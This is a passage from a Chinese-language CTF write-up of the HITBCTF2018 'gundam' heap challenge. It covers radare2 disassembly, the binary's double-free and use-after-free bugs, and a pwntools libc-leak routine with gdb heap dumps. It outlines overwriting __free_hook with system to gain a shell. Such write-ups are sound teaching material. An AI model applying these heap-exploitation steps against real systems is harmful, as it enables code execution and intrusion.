| ||:|| ; JMP XREF from 0x00000f67 (sub.Gundam__u__:_s_ef4)
| ``----> 0x00000fc9 add dword [local_ch], 1
; i = i + 1
| :|| ; JMP XREF from 0x00000f2d (sub.Gundam__u__:_s_ef4)
| :|`-> 0x00000fcd cmp dword [local_ch], 8
; 最多有 9 个 gundam
| `=== 0x00000fd7 mov eax, 0
| 0x00000fdc mov rcx, qword [local_8h]
| 0x00000fe0 xor rcx, qword fs:[0x28]
| ,= 0x00000ff0 leave
\ 0x00000ff1 ret
该函数先判断 gundam_num 是否为 0，如果不是，再根据 factory[i] 和 factory[i]-
>flag 判断某个 gundam 是否存在，如果存在，就将它的 name 和 type 打印出来。
Destory a gundam
1227
6.1.19 pwn HITBCTF2018 gundam
[0x000009e0]> pdf @ sub.Which_gundam_do_you_want_to_Destory:_d32
/ (fcn) sub.Which_gundam_do_you_want_to_Destory:_d32 240
| sub.Which_gundam_do_you_want_to_Destory:_d32 ();
| ; var int local_ch @ rbp-0xc
| ; var int local_8h @ rbp-0x8
| ; CALL XREF from 0x0000115c (main + 151)
| 0x00000d32 push rbp
| 0x00000d33 mov rbp, rsp
| 0x00000d36 sub rsp, 0x10
| 0x00000d3a mov rax, qword fs:[0x28]
; [0x28:8]=0x2170 ; '('
| 0x00000d43 mov qword [local_8h], rax
| 0x00000d47 xor eax, eax
| 0x00000d49 mov eax, dword [0x0020208c]
; [0x20208c:4]=0 ; 取出 gundam_num
| 0x00000d4f test eax, eax
| ,= 0x00000d64 lea rdi, str.Which_gundam_do_you_wan
t_to_Destory: ; 0x12e8 ; "Which gundam do you want to Destory:"
| | 0x00000d6b mov eax, 0
| | 0x00000d70 call sym.imp.printf
; int printf(const char *format)
| | 0x00000d75 lea rax, [local_ch]
| | 0x00000d79 mov rsi, rax
| | 0x00000d7c lea rdi, [0x000012cb]
; "%d"
| | 0x00000d83 mov eax, 0
| | 0x00000d88 call sym.imp.__isoc99_scanf
; 读入序号 i 到 [local_ch]
| | 0x00000d8d mov eax, dword [local_ch]
| | 0x00000d90 cmp eax, 8
| |,= 0x00000db2 lea rdi, str.Invalid_choice
; 0x130d ; "Invalid choice"
| || 0x00000db9 call sym.imp.puts
; int puts(const char *s)
| || 0x00000dbe mov eax, 0
| ||,= 0x00000dc5 mov eax, dword [local_ch]
| || 0x00000dc8 mov eax, eax
| || 0x00000dca lea rdx, [rax*8]
| || 0x00000dd2 lea rax, [0x002020a0]
| || 0x00000dd9 mov rax, qword [rdx + rax]
; 取出 factory[i]
| || 0x00000ddd mov dword [rax], 0
; 将 factory[i]->flag 置为 0
| || 0x00000de3 mov eax, dword [local_ch]
| || 0x00000de6 mov eax, eax
| || 0x00000de8 lea rdx, [rax*8]
| || 0x00000df0 lea rax, [0x002020a0]
| || 0x00000df7 mov rax, qword [rdx + rax]
| || 0x00000dfb mov rax, qword [rax + 8]
; 取出 factory[i]->name
| || 0x00000dff mov rdi, rax
| || 0x00000e02 call sym.imp.free
; free(factory[i]->name)
| || ; JMP XREF from 0x00000d5f (sub.Which_gundam_do_you_
1229
6.1.19 pwn HITBCTF2018 gundam
want_to_Destory:_d32)
| `--> 0x00000e07 mov eax, 0
| | ; JMP XREF from 0x00000dc3 (sub.Which_gundam_do_you_
want_to_Destory:_d32)
| `-> 0x00000e0c mov rcx, qword [local_8h]
| 0x00000e10 xor rcx, qword fs:[0x28]
| ,= 0x00000e20 leave
\ 0x00000e21 ret
该函数用于销毁 gundam，它先将 gundam->flag 置为 0，再释放掉 gundam-
>name。
这里有几个问题：
该函数是通过 factory[i] 来判断某个 gundam 是否存在，而在销毁 gundam 后
并没有将 factory[i] 置空，导致 factory[i]->name 可能被多次释放
name 指针没有被置空，可能导致 UAF
销毁 gundam 后没有将 gundam_num 减 1
Blow up the factory
[0x000009e0]> pdf @ sub.Done_e22
/ (fcn) sub.Done_e22 210
| sub.Done_e22 (int arg_8h);
| ; var int local_ch @ rbp-0xc
| ; var int local_8h @ rbp-0x8
| ; arg int arg_8h @ rbp+0x8
| ; CALL XREF from 0x00001168 (main + 163)
| 0x00000e22 push rbp
| 0x00000e23 mov rbp, rsp
| 0x00000e26 sub rsp, 0x10
| 0x00000e2a mov rax, qword fs:[0x28]
; [0x28:8]=0x2170 ; '('
| 0x00000e33 mov qword [local_8h], rax
1230
6.1.19 pwn HITBCTF2018 gundam
| 0x00000e37 xor eax, eax
| 0x00000e39 mov dword [local_ch], 0
; 循环计数 i，初始化为 0
| ,= 0x00000e45 mov eax, dword [local_ch]
| :| 0x00000e48 lea rdx, [rax*8]
| :| 0x00000e50 lea rax, [0x002020a0]
| :| 0x00000e57 mov rax, qword [rdx + rax]
; 取出 factory[i]
| :| 0x00000e5b test rax, rax
| ,===flag
| |:| 0x00000e78 test eax, eax
| ,==== 0x00000ec3 add dword [local_ch], 1
; i = i + 1
| :| ; JMP XREF from 0x00000e40 (sub.Done_e22)
| :`-> 0x00000ec7 cmp dword [local_ch], 8
; 最多有 9 个 gundam
| `== 0x00000ef2 leave
\ 0x00000ef3 ret
该函数会找出所有 factory[i] 不为 0，且 factory[i]->flag 为 0 的 gundam，然后将该
gundam 结构体释放掉，factory[i] 置为 0，最后 gundam_num 每次减 1。
经过这个过程，销毁 gundam 留下的问题基本解决了，除了 name 指针依然存在。
Exploit
所以利用过程如下：
1. 利用被放入 unsorted bin 的 chunk 泄漏 libc 基址，可以计算出
__free_hook 和 system 的地址。
2. 利用 double free，将 __free_hook 修改为 system 。
1232
6.1.19 pwn HITBCTF2018 gundam
3. 当调用 free 的时候就会调用 system ，获得 shell。
leak
def leak():
global __free_hook_addr
global system_addr
for i in range(9):
build('A'*7)
for i in range(7):
destroy(i) # tcache bin
destroy(7) # unsorted bin
blow_up()
for i in range(8):
build('A'*7)
visit()
leak = u64(io.recvuntil("Type[7]", drop=True)[-6:].ljust(8,
'\x00'))
libc_base = leak - 0x3dac78 # 0x3dac78 = libc_base - leak
__free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info("libc base: 0x%x" % libc_base)
log.info("__free_hook address: 0x%x" % __free_hook_addr)
log.info("system address: 0x%x" % system_addr)
chunk 被放进 unsorted bin 时：
1233
6.1.19 pwn HITBCTF2018 gundam
gdb-peda$ vmmap heap
Start End Perm Name
0x0000555555757000 0x0000555555778000 rw-p [heap]
gdb-peda$ x/30gx 0x0000555555757000+0x10
0x555555757010: 0x0000000000000000 0x0700000000000000 <--
counts
0x555555757020: 0x0000000000000000 0x0000000000000000
0x555555757030: 0x0000000000000000 0x0000000000000000
0x555555757040: 0x0000000000000000 0x0000000000000000
0x555555757050: 0x0000000000000000 0x0000000000000000
0x555555757060: 0x0000000000000000 0x0000000000000000
0x555555757070: 0x0000000000000000 0x0000000000000000
0x555555757080: 0x0000000000000000 0x0000000000000000
0x555555757090: 0x0000000000000000 0x0000000000000000
0x5555557570a0: 0x0000000000000000 0x0000000000000000
0x5555557570b0: 0x0000000000000000 0x0000000000000000
0x5555557570c0: 0x0000000000000000 0x0000555555757a10 <--
entries
0x5555557570d0: 0x0000000000000000 0x0000000000000000
0x5555557570e0: 0x0000000000000000 0x0000000000000000
0x5555557570f0: 0x0000000000000000 0x0000000000000000
gdb-peda$ x/6gx 0x555555757b50-0x10
0x555555757b40: 0x0000000000000000 0x0000000000000111
0x555555757b50: 0x00007ffff7dd2c78 0x00007ffff7dd2c78 <--
unsorted bin
0x555555757b60: 0x0000000000000000 0x0000000000000000
gdb-peda$ vmmap libc
Start End Perm Name
0x00007ffff79f8000 0x00007ffff7bce000 r-xp /home/firmy/gund
am/libc-2.26.so
0x00007ffff7bce000 0x00007ffff7dce000 ---p /home/firmy/gund
am/libc-2.26.so
0x00007ffff7dce000 0x00007ffff7dd2000 r--p /home/firmy/gund
am/libc-2.26.so
0x00007ffff7dd2000 0x00007ffff7dd4000 rw-p /home/firmy/gund
am/libc-2.26.so
gdb-peda$ p 0x00007ffff7dd2c78 - 0x00007ffff79f8000
$1 = 0x3dac78
1234
6.1.19 pwn HITBCTF2018 gundam
可以看到对应的 tcache bin 中已经放满了 7 个 chunk，所以第 8 块 chunk 被放进
了 unsorted bin。
再次 malloc 之后：
gdb-peda$ x/6gx 0x555555757b50-0x10
0x555555757b40: 0x0000000000000000 0x0000000000000111
0x555555757b50: 0x0a41414141414141 0x00007ffff7dd2c78
0x555555757b60: 0x0000000000000000 0x0000000000000000